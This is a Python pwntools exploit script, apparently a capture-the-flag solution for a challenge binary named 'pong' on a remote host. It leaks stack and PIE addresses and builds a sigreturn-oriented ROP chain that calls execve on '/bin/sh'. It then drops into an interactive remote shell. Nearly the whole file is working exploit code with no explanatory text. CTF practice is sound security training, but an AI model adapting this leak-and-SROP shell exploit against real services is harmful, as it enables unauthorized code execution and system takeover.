#!/usr/bin/env python3
from pwn import *

GDB_OFF = 0x555555555000
IP = 'flu.xxx'
PORT = 10060
BINARY = './pong'
ARGS = []
ENV = {}
GDB = f"""
set follow-fork-mode parent
b * _start+0x44 
c"""

context.binary = exe = ELF(BINARY, checksec=False)
context.aslr = True

byt = lambda x: x if isinstance(x, bytes) else x.encode() if isinstance(x, str) else repr(x).encode()
phex = lambda x, y='': print(y + hex(x))
lhex = lambda x, y='': log.info(y + hex(x))
pad = lambda x, s, v=b'\0', o='r': x+(v*(s-len(x))) if o == 'r' else x+(v*(s-len(x)))
padhex = lambda x, s: pad(hex(x)[2:], s, '0', 'l')

t = None
gt = lambda at=None: at if at else t
sl = lambda x, t=None: gt(t).sendline(byt(x))
se = lambda x, t=None: gt(t).send(byt(x))
sla = lambda x, y, t=None: gt(t).sendlineafter(byt(x), byt(y))
sa = lambda x, y, t=None: gt(t).sendafter(byt(x), byt(y))
ra = lambda t=None: gt(t).recvall()
rl = lambda t=None: gt(t).recvline()
re = lambda x, t=None: gt(t).recv(x)
ru = lambda x, t=None: gt(t).recvuntil(byt(x))
it = lambda t=None: gt(t).interactive()
cl = lambda t=None: gt(t).close()

vm = None
def get_target(**kw):
    global vm

    if args.REMOTE:
        # context.log_level = 'debug'
        return remote(IP, PORT)

    from vagd import Dogd, Qegd, Vagd, Shgd, Box
    if not vm:
        vm = Dogd(exe.path, image='alpine_pong', ex=True, fast=True)  # Docker
        # vm = Qegd(exe.path, img=Box.QEMU_JAMMY, ex=True, fast=True)  # Qemu
        # vm = Vagd(exe.path, vbox=Box.VAGRANT_JAMMY64, ex=True, fast=True)  # Vagrant
        # vm = Shgd(exe.path, user='user', host='localhost', port=22, ex=True, fast=True)  # SSH
    return vm.start(argv=ARGS, env=ENV, gdbscript=GDB, **kw)

BUFFER_SIZE = 0x200

def round(txt):
  sl(txt)
  return re(BUFFER_SIZE)

def parse_leak(rawleak):
  leaks = list()

  for i in range(0, BUFFER_SIZE, 8):
    leak = u64(rawleak[i:i+8])
    if leak != 0:
      leaks.append(leak)
      phex(leak, f'{i}: ')

  return leaks
  

# t = get_target()


# 1. ITER

leaks = parse_leak(round(p64(0x6fe1be2)))
STACK = leaks[45] if args.REMOTE else leaks[32]
phex(STACK, "STACK: ")
exe.address = PIE =  leaks[21] - (0x40 if args.REMOTE else 0x1000)
phex(PIE, "PIE: ")

# 2. ITER
round(p64(0x6fe1be2))
# 3. ITER
round(p64(0x6fe1be2))

# 4. ITER AND ROP

SYSCALL = PIE + 0x1036
PRINT = PIE + 0x1024


frame = SigreturnFrame()

PARAMS = STACK - (0x301 + (280-456) if args.REMOTE else 0x221)

frame.rax = constants.SYS_execve
frame.rdi = PARAMS
frame.rsi = PARAMS + 8
frame.rip = SYSCALL # PRINT
frame.rbp = PARAMS-0x100
frame.rsp = PARAMS-0x100

INC_EAX = p64(PIE + 0x103c)

rop = flat(
  INC_EAX * constants.SYS_rt_sigreturn,
  SYSCALL,
  frame,
  b'/bin/sh\0', # PARAMS points here
  PARAMS,
  b'\0' * 0x8,
  0x6fe1be2
)

round(rop)

# parse_leak(re(BUFFER_SIZE))


sleep(.5)

it() # or t.interactive()

